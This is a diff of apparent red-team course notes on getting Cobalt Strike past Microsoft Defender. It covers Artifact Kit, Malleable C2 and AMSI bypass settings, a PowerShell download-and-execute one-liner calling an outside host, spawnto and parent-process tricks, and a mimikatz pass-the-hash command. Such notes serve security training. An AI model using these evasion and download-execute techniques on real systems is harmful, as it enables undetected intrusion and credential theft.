@@ -1,6 +1,6 @@
 # Microsoft Defender Antirus Notes
 
-**Artifact Kit**
+## Artifact Kit
 
 Tools:
 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)
@@ -42,7 +42,7 @@ to load new artifact kit go to *Cobalt Strike>Script manager>Load* and load the 
 
 to reload all new payloads to use this kit, *Payloads>Windows Stageless Generate All Payloads*
 
-**Malleable C2**
+## Malleable C2
 
 Scanning the shellcode payload type with ThreatCheck can be a good way to help find these signatures because although the service binary artifact itself is "clean"
 The raw shellcode is not
@@ -63,7 +63,7 @@ userwx tells the loader to allocate memory for the beacon dll as rw/rx rather th
 cleanup as true tells beacon to free the memory associated with the reflected loader after it has been loaded
 obfuscate to true does a lot of things to obfuscate the loader
 
-**Resource Kit**
+## Resource Kit
 
 we can check for threats in powershell scripts with -e amsi to detect issues, real time protection needs to be enabled for this
 ```
@@ -99,7 +99,7 @@ use the included build script and specify an output directory, then load resourc
 another issue, when hosting powershell payloads with the scripted web delivery method, the compress.ps1 template is used, which decompresses the payload from a gzip stream. easiest workaround is to host your stagless powershell modules directly via *Site Management>Host File*
 
 
-### AMSI vs post-exploitation
+## AMSI vs post-exploitation
 
 AMSI can also catch you with powershell, powerpick, or execute-assembly
 
@@ -122,8 +122,7 @@ check if the config files works
 
 restart teamserver with this change
 
-
-**Manual AMSI Bypasses**
+## Manual AMSI Bypasses
 
 Tools:
 [amsifail](https://amsi.fail/)
@@ -423,7 +422,7 @@ example:
 iex (new-object net.webclient).downloadstring("http://nickelviper.com/bypass"); iex (new-object net.webclient).downloadstring("http://nickelviper.com/a")
 ```
 
-**Behavioural Detections**
+## Behavioural Detections
 
 The process used for post-ex commands and psexec can be changed on the fly in the CS GUI.  To change the post-ex process, use the spawnto command.  x86 and x64 must be specified individually and environment variables can also be used.
 ```
@@ -454,7 +453,7 @@ ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
 ```
 
-### Parent/Child Relationships
+## Parent/Child Relationships
 
 from our initial access payload it will seem like powershell is a child of word
 
@@ -475,7 +474,7 @@ obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc <base64>", Nu
 ```
 
 
-### Command Line Detections
+## Command Line Detections
 
 The easiest workaround is to find a way to achieve the same goal but in a way that doesn't involve the same command line arguments.  For pass-the-hash, we can simply start an arbitrary process and steal its token manually.
 
@@ -483,8 +482,4 @@ The easiest workaround is to find a way to achieve the same goal but in a way th
 mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
 steal_token <PID>
 ```
-
-
-
-
 
